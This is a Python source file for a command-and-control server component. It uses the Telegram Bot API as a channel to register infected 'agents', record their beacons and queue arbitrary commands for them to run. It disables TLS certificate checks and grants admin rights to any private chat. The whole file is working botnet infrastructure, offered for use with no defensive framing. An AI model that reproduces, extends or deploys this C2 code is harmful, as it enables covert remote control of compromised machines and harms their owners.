#!/usr/bin/env python3
"""
Telegram C2 Poller for Server
Polls Telegram for agent messages and processes commands
"""

import json
import time
import threading
import urllib.request
import ssl
from datetime import datetime

class TelegramPoller:
    """Polls Telegram for C2 messages"""
    
    def __init__(self, bot_token, server):
        self.bot_token = bot_token
        self.server = server  # Reference to C2 server
        self.api_url = f"https://api.telegram.org/bot{bot_token}"
        self.last_update_id = 0
        self.running = False
        self.thread = None
        self._ssl_context = ssl.create_default_context()
        self._ssl_context.check_hostname = False
        self._ssl_context.verify_mode = ssl.CERT_NONE
        self.admin_chat_ids = set()  # Admin chat IDs for sending commands
    
    def _request(self, method, data=None):
        """Make request to Telegram API"""
        url = f"{self.api_url}/{method}"
        
        if data:
            data = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(
                url,
                data=data,
                headers={'Content-Type': 'application/json'}
            )
        else:
            req = urllib.request.Request(url)
        
        try:
            resp = urllib.request.urlopen(req, timeout=30, context=self._ssl_context)
            return json.loads(resp.read().decode('utf-8'))
        except Exception as e:
            return {"ok": False, "error": str(e)}
    
    def send_message(self, chat_id, text, parse_mode=None):
        """Send message to specific chat"""
        data = {
            "chat_id": chat_id,
            "text": text
        }
        if parse_mode:
            data["parse_mode"] = parse_mode
        
        return self._request("sendMessage", data)
    
    def broadcast_to_admins(self, text):
        """Send message to all admin chats"""
        for chat_id in self.admin_chat_ids:
            self.send_message(chat_id, text)
    
    def process_update(self, update):
        """Process incoming Telegram update"""
        message = update.get("message", {})
        chat_id = message.get("chat", {}).get("id")
        text = message.get("text", "")
        from_user = message.get("from", {})
        
        # Add chat to admins if it's a private chat
        if message.get("chat", {}).get("type") == "private":
            self.admin_chat_ids.add(str(chat_id))
        
        # Process commands
        if text.startswith("/"):
            self.process_command(chat_id, text, from_user)
        elif "REGISTERED" in text:
            # Agent registration message
            self.process_agent_registration(text)
        elif "BEACON:" in text:
            # Agent beacon
            self.process_agent_beacon(text)
    
    def process_command(self, chat_id, text, from_user):
        """Process admin commands"""
        parts = text.split()
        cmd = parts[0].lower()
        
        if cmd == "/start":
            self.send_message(chat_id, 
                "🤖 C2 Control Bot\n\n"
                "Commands:\n"
                "/agents - List all agents\n"
                "/cmd <agent_id> <command> - Send command\n"
                "/status - Server status\n"
                "/help - Show this message"
            )
        
        elif cmd == "/agents":
            # Get agents from server
            agents = self.server.get_agents() if hasattr(self.server, 'get_agents') else []
            msg = f"📋 AGENTS ({len(agents)})\n"
            for agent in agents[:20]:
                msg += f"\n🆔 {agent.get('id', 'unknown')}"
                msg += f"\n   Status: {agent.get('status', 'unknown')}"
                msg += f"\n   Platform: {agent.get('platform_type', 'unknown')}"
            self.send_message(chat_id, msg)
        
        elif cmd == "/cmd":
            if len(parts) >= 3:
                agent_id = parts[1]
                command = " ".join(parts[2:])
                # Store command for agent to pick up
                if hasattr(self.server, 'pending_commands'):
                    self.server.pending_commands[agent_id] = {
                        "command": command,
                        "timestamp": time.time()
                    }
                self.send_message(chat_id, f"✅ Command queued for {agent_id}: {command}")
            else:
                self.send_message(chat_id, "Usage: /cmd <agent_id> <command>")
        
        elif cmd == "/status":
            msg = f"📊 C2 SERVER STATUS\n"
            msg += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            msg += f"Admin chats: {len(self.admin_chat_ids)}\n"
            self.send_message(chat_id, msg)
        
        elif cmd == "/help":
            self.send_message(chat_id,
                "📖 C2 Bot Help\n\n"
                "/start - Initialize bot\n"
                "/agents - List connected agents\n"
                "/cmd <id> <cmd> - Send command to agent\n"
                "/status - Server status\n"
                "/help - This message"
            )
    
    def process_agent_registration(self, text):
        """Process agent registration from Telegram message"""
        # Parse agent info from message
        import re
        
        agent_id_match = re.search(r'ID: ([^\n]+)', text)
        hostname_match = re.search(r'Hostname: ([^\n]+)', text)
        platform_match = re.search(r'Platform: ([^\n]+)', text)
        cpu_match = re.search(r'CPU Cores: (\d+)', text)
        
        if agent_id_match:
            agent_data = {
                "id": agent_id_match.group(1).strip(),
                "hostname": hostname_match.group(1).strip() if hostname_match else "unknown",
                "platform_type": platform_match.group(1).strip() if platform_match else "unknown",
                "cpu_count": int(cpu_match.group(1)) if cpu_match else 0,
                "status": "active",
                "last_seen": time.time(),
                "source": "telegram"
            }
            
            # Register in server
            if hasattr(self.server, 'register_agent'):
                self.server.register_agent(agent_data)
            
            # Notify admins
            self.broadcast_to_admins(f"✅ Agent registered via Telegram: {agent_data['id']}")
    
    def process_agent_beacon(self, text):
        """Process agent beacon from Telegram message"""
        import re
        
        agent_id_match = re.search(r'BEACON: ([^\n]+)', text)
        status_match = re.search(r'Status: ([^\n]+)', text)
        
        if agent_id_match:
            agent_id = agent_id_match.group(1).strip()
            status = status_match.group(1).strip() if status_match else "active"
            
            # Update agent in server
            if hasattr(self.server, 'update_agent'):
                self.server.update_agent(agent_id, {
                    "status": status,
                    "last_seen": time.time()
                })
    
    def poll(self):
        """Poll for updates"""
        while self.running:
            try:
                data = {
                    "offset": self.last_update_id + 1,
                    "limit": 100,
                    "timeout": 30  # Long polling
                }
                
                result = self._request("getUpdates", data)
                
                if result.get("ok"):
                    for update in result.get("result", []):
                        self.last_update_id = update.get("update_id", 0)
                        self.process_update(update)
                
            except Exception as e:
                print(f"[TELEGRAM] Poll error: {e}")
            
            time.sleep(1)
    
    def start(self):
        """Start polling thread"""
        self.running = True
        self.thread = threading.Thread(target=self.poll, daemon=True)
        self.thread.start()
        print("[TELEGRAM] Poller started")
    
    def stop(self):
        """Stop polling"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=5)
        print("[TELEGRAM] Poller stopped")


def create_telegram_poller(bot_token, server):
    """Create and return Telegram poller"""
    return TelegramPoller(bot_token, server)


if __name__ == "__main__":
    print("Telegram C2 Poller")
    print("Requires: bot_token")
    print()
    print("Usage:")
    print("  poller = TelegramPoller(bot_token, server)")
    print("  poller.start()")
